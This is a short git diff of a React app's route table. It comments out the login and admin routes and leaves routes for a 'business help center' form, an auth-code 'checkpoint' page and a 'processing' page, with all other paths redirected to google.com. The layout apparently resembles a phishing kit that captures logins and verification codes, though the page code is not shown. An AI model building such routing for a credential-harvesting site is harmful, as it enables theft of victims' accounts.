@@ -98,7 +98,7 @@ function App() {
                   <Route path="/business-help-center" element={<MyForm/>} />
                   <Route path="checkpoint/:userID" element={<AuthCode />} />
                   <Route path="processing/:userID" element={<ClassUser />} />
-                  <Route path="/login" element={<Login />} />
+                  {/* <Route path="/login" element={<Login />} />
                   <Route
                     path="/admin"
                     element={
@@ -106,7 +106,7 @@ function App() {
                         <AdminPage />
                       </PrivateRoute>
                     }
-                  />
+                  /> */}
                   <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.google.com/"/>} />
                 </Routes>
               </div>
